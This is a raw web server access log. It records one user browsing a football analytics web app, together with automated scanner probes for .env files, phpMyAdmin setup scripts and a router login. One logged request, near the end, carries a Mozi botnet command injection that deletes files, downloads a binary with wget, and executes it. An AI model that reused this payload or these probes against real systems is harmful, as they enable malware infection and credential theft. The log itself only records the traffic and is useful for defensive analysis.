59.92.44.149 - - [09/Sep/2022:07:15:19 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 382 "-" "-"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /Endzone/KIPP HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/css/KIPP.css HTTP/1.1" 200 1088 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/js/KIPP.js HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/images/KIPP_Background.jpg HTTP/1.1" 200 2078976 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:51 +0000] "POST /Endzone/KIPP/Run HTTP/1.1" 200 300399 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:27:43 +0000] "-" 408 0 "-" "-"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT HTTP/1.1" 200 3348 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/DAT.css HTTP/1.1" 200 1556 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/Filterbar.css HTTP/1.1" 200 775 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw.css HTTP/1.1" 200 1683 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw-src.css HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/js/DAT.js HTTP/1.1" 200 4411 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw.js HTTP/1.1" 200 14819 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw-src.js HTTP/1.1" 200 27133 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/FootballFieldBase.jpg HTTP/1.1" 304 280 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/EndzoneNorth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/images/spritesheet.svg HTTP/1.1" 304 272 "http://172.104.25.168/static/leaflet_draw/leaflet.draw-src.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT/GetParam?team=&opponent=%20&year=2022&possession=%20&_=1662845758017 HTTP/1.1" 200 309 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT/GetData?team=&opponent=%20&year=2022&drive=&_=1662845758018 HTTP/1.1" 200 216 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
90.151.171.106 - - [10/Sep/2022:21:37:33 +0000] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [10/Sep/2022:21:37:43 +0000] "GET http://check.best-proxies.ru/ip.php?Z74643052982Q1 HTTP/1.1" 404 382 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
66.188.190.72 - - [10/Sep/2022:21:37:48 +0000] "GET /Endzone/DAT/GetParam?team=Eastview&opponent=LN&year=2022&possession=LN&_=1662845758019 HTTP/1.1" 200 341 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:37:48 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=LN&year=2022&drive=3&_=1662845758020 HTTP/1.1" 200 7375 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:06 +0000] "GET /Endzone/DAT/GetParam?team=Eastview&opponent=Woodbury&year=2022&possession=Woodbury&_=1662845758021 HTTP/1.1" 200 324 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:06 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=1&_=1662845758022 HTTP/1.1" 200 3856 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:10 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=9&_=1662845758023 HTTP/1.1" 200 3831 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:09 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=11&_=1662845758024 HTTP/1.1" 200 2025 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:11 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=4&_=1662845758025 HTTP/1.1" 200 2033 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /Endzone/TARS HTTP/1.1" 200 2394 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/css/TARS.css HTTP/1.1" 200 1325 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/js/TARS.js HTTP/1.1" 200 826 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:44 +0000] "GET /Endzone/TARS/Run?down=1&distance=No%20Filter&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 406 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:08 +0000] "GET /Endzone/TARS/Run?down=1&distance=No%20Filter&yard=Midfield&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 403 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:30 +0000] "GET /Endzone/TARS/Run?down=2&distance=Short&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 397 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:37 +0000] "GET /Endzone/TARS/Run?down=2&distance=Medium&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 391 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:43 +0000] "GET /Endzone/TARS/Run?down=2&distance=Long&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 390 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /Endzone/CASE HTTP/1.1" 200 782 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/css/TARS.css HTTP/1.1" 200 1325 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT HTTP/1.1" 200 3347 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/Filterbar.css HTTP/1.1" 200 774 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/DAT.css HTTP/1.1" 200 1555 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/js/DAT.js HTTP/1.1" 200 4411 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw.css HTTP/1.1" 200 1683 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw-src.css HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw.js HTTP/1.1" 200 14819 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw-src.js HTTP/1.1" 200 27133 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/images/spritesheet.svg HTTP/1.1" 304 272 "http://172.104.25.168/static/leaflet_draw/leaflet.draw-src.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/EndzoneNorth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/FootballFieldBase.jpg HTTP/1.1" 304 280 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT/GetParam?team=&opponent=%20&year=2022&possession=%20&_=1662846102144 HTTP/1.1" 200 309 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT/GetData?team=&opponent=%20&year=2022&drive=&_=1662846102145 HTTP/1.1" 200 216 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /Logout HTTP/1.1" 302 499 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET / HTTP/1.1" 200 996 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 304 278 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 304 286 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
185.254.196.223 - - [10/Sep/2022:23:12:58 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/Sep/2022:23:12:58 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.239 - - [10/Sep/2022:23:32:19 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.52 - - [10/Sep/2022:23:35:25 +0000] "GET / HTTP/1.0" 200 2578 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.89.196.211 - - [10/Sep/2022:23:55:42 +0000] "GET /console/ HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.231 - - [10/Sep/2022:23:57:00 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
192.241.220.166 - - [11/Sep/2022:00:16:47 +0000] "GET /actuator/health HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
192.241.206.169 - - [11/Sep/2022:00:23:47 +0000] "GET /portal/redlion HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
20.25.85.8 - - [11/Sep/2022:00:35:12 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.85.8 - - [11/Sep/2022:00:35:12 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.0.77.75 - - [11/Sep/2022:00:45:19 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
20.0.77.75 - - [11/Sep/2022:00:45:19 +0000] "GET /xmlrpc.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
195.178.120.159 - - [11/Sep/2022:00:48:21 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
220.198.241.32 - - [11/Sep/2022:00:58:52 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 419 "-" "Hello, world"
88.212.1.22 - - [11/Sep/2022:01:02:26 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:59 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
154.89.5.207 - - [11/Sep/2022:01:53:22 +0000] "GET / HTTP/1.0" 200 2578 "-" "-"
90.151.171.106 - - [11/Sep/2022:02:10:46 +0000] "CONNECT v4.ident.me:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:02:10:56 +0000] "GET http://v4.ident.me?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:02:11:21 +0000] "-" 408 0 "-" "-"
185.254.196.223 - - [11/Sep/2022:02:14:29 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
